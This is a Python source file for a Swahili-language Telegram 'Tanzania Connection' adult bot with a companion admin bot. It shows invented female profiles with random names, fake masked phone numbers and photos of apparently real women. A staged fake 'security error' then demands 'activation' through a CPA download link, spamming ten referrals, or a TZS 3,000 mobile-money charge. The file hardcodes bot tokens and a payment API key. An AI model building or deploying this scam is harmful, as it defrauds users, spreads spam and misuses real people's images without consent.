import os
import random
import asyncio
import logging
import requests
from datetime import datetime
from flask import Flask
from threading import Thread

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, ContextTypes, CommandHandler,
    CallbackQueryHandler, MessageHandler, filters, ConversationHandler
)

from database import (
    init_db, add_user, add_referral, get_referral_count, get_all_users, 
    get_total_users_count, get_seen_images, add_seen_image, reset_seen_images, save_order
)

# --- TOKENS & CONFIGS ---
MAIN_BOT_TOKEN = "8050903104:AAH0KH4ah-bdLkkNBoW2pMop3FO5-H2DN-4"
ADMIN_BOT_TOKEN = "8900606629:AAFrZXxBockQJSAJ8SqwUid98lNFt3XL4Co"
ADMIN_ID = "8231186202"
CPA_LINK = "https://tinyurl.com/Activebot"
HARAKAPAY_API_KEY = "hpk_29f08857e1613f2df534581540097759168284249880fa85"
HARAKAPAY_BASE_URL = "https://harakapay.net"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# --- STATES FOR CONVERSATION ---
WAITING_PHONE = 1

# --- PRIORITY REGIONS KEYBOARD LAYOUT ---
def get_region_keyboard():
    keyboard = [
        [KeyboardButton("Dar es Salaam")],
        [KeyboardButton("Arusha"), KeyboardButton("Mwanza")],
        [KeyboardButton("Dodoma"), KeyboardButton("Zanzibar"), KeyboardButton("Mbeya")],
        [KeyboardButton("Geita"), KeyboardButton("Iringa"), KeyboardButton("Kagera")],
        [KeyboardButton("Katavi"), KeyboardButton("Kigoma"), KeyboardButton("Kilimanjaro")],
        [KeyboardButton("Lindi"), KeyboardButton("Manyara"), KeyboardButton("Mara")],
        [KeyboardButton("Morogoro"), KeyboardButton("Mtwara"), KeyboardButton("Njombe")],
        [KeyboardButton("Pwani"), KeyboardButton("Rukwa"), KeyboardButton("Ruvuma")],
        [KeyboardButton("Shinyanga"), KeyboardButton("Simiyu"), KeyboardButton("Singida")],
        [KeyboardButton("Tabora"), KeyboardButton("Tanga")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

REGIONS_FLAT = [
    "Dar es Salaam", "Arusha", "Mwanza", "Dodoma", "Zanzibar", "Mbeya", "Geita", "Iringa", "Kagera",
    "Katavi", "Kigoma", "Kilimanjaro", "Lindi", "Manyara", "Mara", "Morogoro", "Mtwara", "Njombe",
    "Pwani", "Rukwa", "Ruvuma", "Shinyanga", "Simiyu", "Singida", "Tabora", "Tanga"
]

# --- EXPANDED TANZANIAN NAMES ---
NAMES = [
    "Asha", "Neema", "Amina", "Rehema", "Subira", "Zainabu", "Mariam", "Sophia", "Latifa", "Yasmin",
    "Tatu", "Zuhura", "Janet", "Vero", "Happy", "Joyce", "Stella", "Lilian", "Agnes", "Mwanahamis",
    "Fatma", "Saida", "Zakia", "Fatuma", "Jamila", "Hadija", "Mariamu", "Salma", "Mwanahawa", "Sharifa",
    "Khadija", "Mwanaidi", "Saada", "Zainab", "Mwashamba", "Mwanaisha", "Asia", "Mwamvita", "Mwamini",
    "Kulthum", "Mwatima", "Mwashiuya", "Hafsa", "Halima", "Rukia", "Mtumwa", "Muna", "Mwajuma", "Mwaka",
    "Siti", "Zulekha", "Sakina", "Mwanne", "Mwajabu", "Batuli", "Vanessa", "Sarah", "Irene", "Diana",
    "Natasha", "Linda", "Elizabeth", "Jackline", "Grace", "Naomi", "Brenda", "Judith", "Carol", "Mercy",
    "Ruth", "Catherine", "Joan", "Gloria", "Lucy", "Rose", "Florence", "Winnie", "Veronica", "Angel",
    "Faith", "Hope", "Nancy", "Sylvia", "Belinda", "Miriam", "Dorcas", "Queen", "Precious", "Rebecca",
    "Deborah", "Tina", "Aida", "Flora", "Anita", "Rashida", "Zuleha", "Magreth", "Zaina", "Glory"
]

# --- EXPANDED IMAGE POOL (Add up to 150+ here) ---
IMAGES = [
    "https://i.postimg.cc/0j5pWDd3/FB-IMG-17498784707977300.jpg",
    "https://i.postimg.cc/Bbh2dbmv/FB-IMG-17498785863347517.jpg",
    "https://i.postimg.cc/qMTfRRBF/FB-IMG-17498786090088579.jpg",
    "https://i.postimg.cc/s2y14yJH/FB-IMG-17530068750873814.jpg",
    "https://i.postimg.cc/xdR8s7xf/FB-IMG-17530068973508200.jpg",
    "https://i.postimg.cc/MT25DnL2/FB-IMG-17530069104410087.jpg",
    "https://i.postimg.cc/VktbFKPv/FB-IMG-17530069297805077.jpg",
    "https://i.postimg.cc/T2HLMzRh/FB-IMG-17530069427792985.jpg",
    "https://i.postimg.cc/PxVxHDn0/FB-IMG-17530069517293714.jpg",
    "https://i.postimg.cc/Px5x049m/FB-IMG-17530069634125447.jpg"
]

# --- MAIN BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    add_user(user_id, user.username, user.first_name, str(datetime.utcnow()))

    if context.args:
        ref_id = context.args[0]
        add_referral(ref_id, user_id)

    # Age Verification Gate
    await update.message.reply_text(
        "🔞 *SYSTEM AGE VERIFICATION*\n\n"
        "Huduma hii ni maalum kwa ajili ya watu wazima pekee (18+). Tafadhali thibitisha umri wako kuendelea.\n\n"
        "👇 *Chagua hapa chini:*",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ NDIO, NINA 18+", callback_data="age_yes"),
             InlineKeyboardButton("❌ HAPANA", callback_data="age_no")]
        ])
    )

async def age_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "age_no":
        await query.message.edit_text("❌ Samahani, huwezi kutumia bot hii ikiwa una chini ya miaka 18.")
        return

    # Cinematic self-destructing loading sequence
    load1 = await query.message.edit_text("🔐 Inathibitisha vigezo vya usalama...... ⏳")
    await asyncio.sleep(1.5)
    load2 = await load1.edit_text("⚙️ Inapakia mfumo wa usajili wa mikoa..... 🔄")
    await asyncio.sleep(1.5)
    await load2.delete()

    welcome_text = (
        f"🍑 Mambo {query.from_user.first_name}! Karibu kwenye *Tanzania Connection Bot* 🔞🇹🇿\n\n"
        "📍 Chagua mkoa wako hapa chini uanze kutafuta Masugar Mummy, Pisi kali, Watoto wa chuo, na Mashangazi sasa hivi! 💃🔥\n"
        "🆓 Huduma ni *BURE 100%* masaa 24/7!\n\n"
        "👇 *Bonyeza mkoa uliopo hapa chini* 👇"
    )
    await query.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=get_region_keyboard())

async def region_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    region = update.message.text.strip()
    if region not in REGIONS_FLAT:
        return

    user_id = str(update.effective_user.id)

    # Loading simulation
    searching = await update.message.reply_text("🔍 Inatafuta pisi kali na mashangazi active eneo lako..... ⏳")
    await asyncio.sleep(2)
    await searching.delete()

    # Non-repeating image logic
    seen = get_seen_images(user_id)
    available_images = [img for img in IMAGES if img not in seen]
    if not available_images:
        reset_seen_images(user_id)
        available_images = IMAGES

    image_url = random.choice(available_images)
    add_seen_image(user_id, image_url)

    name = random.choice(NAMES)
    age = random.randint(18, 25)
    prefix = random.choice(["07", "06"])
    number = f"||{prefix}{random.randint(10,99)}••••{random.randint(10,99)}||"

    caption = (
        f"🔥 *MPYA NDANI YA {region.upper()}* 🔥\n\n"
        f"💋 *JINA:* {name}\n"
        f"🎂 *UMRI:* {age} Years\n"
        f"📍 *ENEO:* {region}\n"
        f"📞 *NAMBA YA SIMU:* {number}\n"
        f"💎 *AINA:* Verified Connection\n\n"
        "👇 *Bonyeza kitufe hapa chini kuunganishwa nae mara moja* 👇"
    )

    await update.message.reply_photo(
        photo=image_url,
        caption=caption,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 KUONGANISHWA NAE", callback_data="get_connection")]
        ])
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)

    if query.data == "get_connection":
        step1 = await query.message.reply_text("⚠️ *Inachunguza utambulisho wa mtumiaji...* ⏳", parse_mode="Markdown")
        await asyncio.sleep(1.5)
        step2 = await step1.edit_text("🔒 *Mfumo umegundua hujathibitisha akaunti yako (Security Firewall)...* ⚙️", parse_mode="Markdown")
        await asyncio.sleep(1.5)
        await step2.delete()

        await query.message.reply_text(
            "🛑 *SYSTEM SECURITY ERROR [ERR_AUTH_403]* 🛑\n\n"
            "Uunganishwaji umesitishwa kwa muda. Ili kulinda faragha ya mhusika, unahitaji kukamilisha **Uthibitisho wa Mfumo (System Activation)** kwa kuchagua moja ya njia 3 hapa chini 👇",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ ACTIVATION 1", callback_data="activation1")],
                [InlineKeyboardButton("✅ ACTIVATION 2", callback_data="activation2")],
                [InlineKeyboardButton("💳 ACTIVATION 3 (TZS 3,000)", callback_data="activation3")],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back")]
            ])
        )
    elif query.data == "activation1":
        await query.message.edit_text(
            "🔐 *JINSI YA KUACTIVATE [1]*\n\n"
            "1️⃣ Bonyeza button iliyo hapa chini 👇\n"
            "2️⃣ Download App & jibu maswali kwenye mfumo\n"
            "3️⃣ UkIMALIZA, utapokea ujumbe wa uthibitisho kuunganishwa! 🎯",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📥 KUONGANISHWA", url=CPA_LINK)],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
            ])
        )
    elif query.data == "activation2":
        ref_count = get_referral_count(user_id)
        await query.message.edit_text(
            f"👥 *JINSI YA KUFANYA VERIFICATION [2]*\n\n"
            f"🔗 *Link yako ya Mwaliko:*\n`https://t.me/connectiontzzbot?start={user_id}`\n\n"
            f"⏳ *Waliojiunga kupitia wewe:* `{ref_count}/10`\n\n"
            "📢 Sambaza link hii kwa watu 10!\n"
            "Ukikamilisha, tumia neno *APPROVAL* kisha mtumie Admin wetu maalum @Aishasmith0 kukupa kibali.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 CHEKI IDADI", callback_data="check_refs")],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
            ])
        )
    elif query.data == "check_refs":
        ref_count = get_referral_count(user_id)
        if ref_count < 10:
            await query.message.reply_text(
                f"🚫 *BADO HUJATIMIZA REFERRAL 10.*\n👥 Waliojiunga: `{ref_count}/10`",
                parse_mode="Markdown"
            )
        else:
            await query.message.reply_text(
                "🎉 *HONGERA!*\n\n✅ UMEKAMILISHA VERIFICATION YA PILI!\nTafadhali wasiliana na Admin wetu @Aishasmith0 na utume neno **APPROVAL** kupata kibali chako cha kuunganishwa.",
                parse_mode="Markdown"
            )
    elif query.data == "activation3":
        await query.message.edit_text(
            "💳 *ACTIVATION YA HARAKA - TZS 3,000*\n\n"
            "Tafadhali tuma namba yako ya simu ya mtandao (M-Pesa, TigoPesa, AirtelMoney) kwa mfumo wa mfano: `0712345678`\n\n"
            "Weka namba yako kwenye ujumbe unaofuata 👇",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
            ])
        )
        return WAITING_PHONE
    elif query.data == "back_to_error":
        await query.message.edit_text(
            "🛑 *SYSTEM SECURITY ERROR [ERR_AUTH_403]* 🛑\n\nCHAGUA NJIA MOJA YA ACTIVATION HAPA CHINI 👇",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ ACTIVATION 1", callback_data="activation1")],
                [InlineKeyboardButton("✅ ACTIVATION 2", callback_data="activation2")],
                [InlineKeyboardButton("💳 ACTIVATION 3 (TZS 3,000)", callback_data="activation3")],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back")]
            ])
        )
    elif query.data == "back":
        await query.message.reply_text("⬅️ Chagua mkoa mwingine hapa chini:", reply_markup=get_region_keyboard())

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    phone = update.message.text.strip()

    if not phone.startswith("0") or len(phone) < 10:
        await update.message.reply_text("❌ Namba si sahihi. Tafadhali weka namba sahihi (mfano: 0712345678):")
        return WAITING_PHONE

    status_msg = await update.message.reply_text("⏳ Inatuma ombi la USSD Push kwenye simu yako...")

    # Call HarakaPay Collect API
    try:
        response = requests.post(
            f"{HARAKAPAY_BASE_URL}/api/v1/collect",
            json={
                "phone": phone,
                "amount": 3000,
                "description": "Connection Activation Fee"
            },
            headers={
                "Content-Type": "application/json",
                "X-API-Key": HARAKAPAY_API_KEY
            },
            timeout=15
        )
        res_data = response.json()

        if res_data.get("success"):
            order_id = res_data.get("order_id")
            save_order(order_id, user_id, phone, 3000, "pending")
            await status_msg.edit_text(
                f"📱 **USSD PUSH IMETUMWA!**\n\n"
                f"Tafadhali weka PIN kwenye simu yako kulipia TZS 3,000.\n"
                f"Order ID yako: `{order_id}`\n\n"
                f"Baada ya kulipia, tafadhali wasiliana na Admin wetu @Aishasmith0 na utume neno **APPROVAL** pamoja na Order ID hii.",
                parse_mode="Markdown"
            )
        else:
            await status_msg.edit_text(f"❌ Imeshindikana kutuma ombi: {res_data.get('error', 'Jaribu tena baadaye.')}")
    except Exception as e:
        await status_msg.edit_text("❌ Kulitokea hitilafu ya kimtandao wakati wa kuunganishwa na HarakaPay.")

    return ConversationHandler.END


# --- ADMIN BOT INTERACTIVE PANEL (@connectiontzzadminbot) ---
async def admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return
    await update.message.reply_text(
        "👑 *Tanzania Connection - Master Admin Panel*\n\n"
        "Chagua kitufe unachotaka kusimamia hapa chini:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Angalia Takwimu & Salio", callback_data="admin_stats")],
            [InlineKeyboardButton("📢 Tuma Tangazo (Broadcast)", callback_data="admin_broadcast_prompt")]
        ])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if str(query.from_user.id) != ADMIN_ID:
        return
    await query.answer()

    if query.data == "admin_stats":
        total_users = get_total_users_count()
        # Fetch wallet balance from HarakaPay
        wallet_bal = 0
        try:
            res = requests.get(f"{HARAKAPAY_BASE_URL}/api/v1/balance", headers={"X-API-Key": HARAKAPAY_API_KEY}, timeout=10).json()
            if res.get("success"):
                wallet_bal = res.get("wallet_balance", 0)
        except Exception:
            pass

        await query.message.edit_text(
            f"📊 *SYSTEM STATISTICS & WALLET*\n\n"
            f"👥 Total Registered Users: `{total_users}`\n"
            f"💰 HarakaPay Wallet Balance: `TZS {wallet_bal}`\n\n"
            f"Bonyeza /start kurudi kwenye menyu kuu.",
            parse_mode="Markdown"
        )
    elif query.data == "admin_broadcast_prompt":
        await query.message.edit_text(
            "📢 *MATANGAZO (BROADCAST)*\n\n"
            "Tuma ujumbe wako kwa kuandika mfano huu kwenye Admin Bot:\n"
            "`/broadcast Ujumbe wako hapa...`",
            parse_mode="Markdown"
        )

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, main_app):
    if str(update.effective_user.id) != ADMIN_ID:
        return
    
    text = " ".join(context.args)
    if not text and not update.message.reply_to_message:
        await update.message.reply_text("⚠️ Andika ujumbe wa kutoa broadcast au reply kwenye picha/ujumbe!")
        return

    users = get_all_users()
    success = 0
    failed = 0

    status_msg = await update.message.reply_text(f"🚀 Inaanza kutuma kwa watumiaji {len(users)}...")

    for uid in users:
        try:
            if update.message.reply_to_message:
                await main_app.bot.copy_message(chat_id=uid, from_chat_id=update.effective_chat.id, message_id=update.message.reply_to_message.message_id)
            else:
                await main_app.bot.send_message(chat_id=uid, text=text, parse_mode="Markdown")
            success += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1

    await status_msg.edit_text(f"✅ Broadcast Imekamilika!\n\nImetumika: {success}\nImeshindikana: {failed}")


# --- FLASK WEB SERVER ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Connection Bot Upgraded & Running 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

# --- UNIFIED ASYNC MAIN RUNNER ---
async def main():
    init_db()

    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    main_app = ApplicationBuilder().token(MAIN_BOT_TOKEN).build()
    admin_app = ApplicationBuilder().token(ADMIN_BOT_TOKEN).build()

    # Conversation handler for phone collection (Activation 3)
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle_callback, pattern="^activation3$")],
        states={
            WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)]
        },
        fallbacks=[]
    )

    # Main Bot Handlers
    main_app.add_handler(CommandHandler("start", start))
    main_app.add_handler(CallbackQueryHandler(age_callback, pattern="^age_"))
    main_app.add_handler(conv_handler)
    main_app.add_handler(CallbackQueryHandler(handle_callback))
    main_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, region_click))

    # Admin Bot Handlers
    admin_app.add_handler(CommandHandler("start", admin_start))
    admin_app.add_handler(CallbackQueryHandler(admin_callback))
    admin_app.add_handler(CommandHandler("broadcast", lambda u, c: admin_broadcast(u, c, main_app)))

    await main_app.initialize()
    await admin_app.initialize()
    await main_app.start()
    await admin_app.start()

    await main_app.updater.start_polling()
    await admin_app.updater.start_polling()

    print("🤖 Upgraded Main Bot & Interactive Admin Bot are running successfully!")

    stop_event = asyncio.Event()
    await stop_event.wait()

if __name__ == "__main__":
    asyncio.run(main())
